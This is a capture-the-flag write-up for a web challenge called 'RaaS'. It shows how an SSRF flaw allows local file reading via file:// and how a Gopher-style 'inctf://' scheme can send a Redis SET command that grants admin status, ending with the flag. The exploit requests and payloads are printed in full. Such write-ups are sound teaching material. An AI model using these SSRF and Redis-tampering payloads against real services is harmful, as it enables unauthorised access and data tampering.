---
description: SSRF using Gopher protocol leads to tampering of Redis key-value store
---

# RaaS

## Challenge

**Description:** Since everything is going online, I decided to make an easy Requests as a Service Bot to make life easier, but I seem to have messed up oops!!!

**Author:** [Capt-k](https://twitter.com/Captainkay11)

## Solution

### Local File Inclusion

We are able to enter a URL for the server to request. A pretty trivial LFI vulnerability exists as a result of SSRF, allowing us to view files using the `file://` protocol.

![](<../../.gitbook/assets/Screenshot 2021-08-16 at 6.59.26 PM.png>)

Since we're provided with the Dockerfile, we know that the server code is in `/code/app.py`.

```
ADD flask-server /code
WORKDIR /code
RUN pip install -r requirements.txt
CMD ["python", "app.py"]
```

Thus, we can request `file:///code/app.py` to view the server code.

```http
POST / HTTP/1.1
Host: web.challenge.bi0s.in:6969
Content-Length: 33

...

url=file%3A%2F%2F%2Fcode%2Fapp.py
```

Immediately, we see that a Redis database is used. The hostname is `redis`, and it is listening on port 6379.

If a POST request is received, the `Requests_On_Steroids` function, which we will analyze later, is used to fetch the URL. Otherwise, the `<userID>_isAdmin` key in the Redis database is checked. If the value is "yes", then the flag is shown in the response.

```python
from flask import Flask, request,render_template,request,make_response
import redis
import time
import os
from utils.random import Upper_Lower_string
from main import Requests_On_Steroids
app = Flask(__name__)

# Make a connection of the queue and redis
r = redis.Redis(host='redis', port=6379)
#r.mset({"Croatia": "Zagreb", "Bahamas": "Nassau"})
#print(r.get("Bahamas"))
@app.route("/",methods=['GET','POST'])
def index():
    if request.method == 'POST':
        url = str(request.form.get('url'))
        resp = Requests_On_Steroids(url)
        return resp
    else:   
        resp = make_response(render_template('index.html'))
        if not request.cookies.get('userID'):
            user=Upper_Lower_string(32)
            r.mset({str(user+"_isAdmin"):"false"})
            resp.set_cookie('userID', user)
        else:
            user=request.cookies.get('userID')
            flag=r.get(str(user+"_isAdmin"))
            if flag == b"yes":
                resp.set_cookie('flag',str(os.environ['FLAG']))
            else:
                resp.set_cookie('flag', "NAAAN")
        return resp

if __name__ == "__main__":
    app.run('0.0.0.0')
```

It appears that we would have to overwrite our `<userID>_isAdmin` value. Since we have a SSRF vulnerability, we might be able to leverage it to communicate with the Redis instance.

### Redis Over Gopher

In `main.py`, we can see that the `Requests_On_Steroids` function supports the Gopher protocol. Using Gopher, we can communicate with any TCP server (but of course, we would have to follow the service's higher-layer protocol). 

However, instead of `gopher://`, we must use `inctf://` instead.

```python
import requests, re, io, socket
from urllib.parse import urlparse, unquote_plus
import os
from modules.Gophers import GopherAdapter 
from modules.files import LocalFileAdapter 


def Requests_On_Steroids(url):
    try:
        s = requests.Session()
        s.mount("inctf:", GopherAdapter())
        s.mount('file://', LocalFileAdapter())
        resp = s.get(url)
        assert resp.status_code == 200
        return(resp.text)
    except:
        return "SOME ISSUE OCCURED"
    

#resp = s.get("butts://127.0.0.1:6379/_get dees")
```

In `modules/Gophers.py`, we find the `GopherAdapter` code.

```python
import requests, re, io, socket
from urllib.parse import urlparse, unquote_plus
import os

...

class GopherAdapter(requests.adapters.BaseAdapter):

    ...

    def _connect_and_read(self, parsed):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(self._netloc_to_tuple(parsed.netloc))
        msg = parsed.path.replace('/_','')
        if hasattr(parsed, "query"):
            msg += "\t" + parsed.query
        msg += "\r\n"
        print(bytes(msg, 'utf-8'))
        s.sendall(bytes(msg, 'utf-8'))
        f = s.makefile("rb")
        res = b""
        data = f.readline()
        print(data)
        f.close()
        return res

    ...
```

With some Googling, we can find out that the Gopher adapter was actually modified from this [GitHub gist](https://gist.github.com/MineRobber9000/24c87d3fb50d0b942989cbe4d4da7e73). I wanted to find out if any changes was made from the original script, so I diff-ed the two scripts.

![](../../.gitbook/assets/upload\_0c5ea44b408970eff89e390b45d2dae1.png)

Interestingly,  a line of code was modified to remove `/_` in the URL's path.

```python
msg = parsed.path.replace('/_','')
```

Ideally, we would send multi-line input using the [RESP protocol](https://redis.io/topics/protocol), but this wouldn't work because `urllib.parse` was updated to [strip newline characters](https://docs.python.org/3.6/library/urllib.parse.html#module-urllib.parse). 

Redis also offers inline commands, allowing us to send our commands directly, but without the above change, our inline commands (`parsed.path`) would still look like this:

```
/SET <userID>_isAdmin "yes"
```

The `/SET` command is unrecognized, leading to an error. Instead, we can leverage the replacement using the following payload:

```
url=inctf://redis:6379/_SET <userID>_isAdmin "yes"
```

The path, when replaced, would be

```
SET <userID>_isAdmin "yes"
```

which sets our `<userID>_isAdmin` value to "yes".

![](<../../.gitbook/assets/image (44).png>)

This gives us the flag: `inctfi{IDK_WHY_I_EVEN_USED_REDIS_HERE!!!}`
